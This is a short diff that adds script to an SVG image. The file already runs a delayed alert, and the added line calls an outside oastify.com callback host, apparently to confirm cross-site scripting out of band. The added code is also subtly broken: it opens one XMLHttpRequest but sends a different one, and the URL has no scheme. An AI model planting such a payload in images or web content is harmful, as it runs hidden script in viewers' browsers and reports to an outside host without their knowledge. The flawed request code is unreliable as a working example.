@@ -3,7 +3,7 @@
     <script>
         setTimeout(function() {
             alert('Delayed Execution');
-            
+            new XMLHttpRequest().open('GET', 'woohr3vfzkok1jvjkrmr6q6xhonfb6zv.oastify.com', true), new XMLHttpRequest().send();
         }, 0);
     </script>
 </svg>
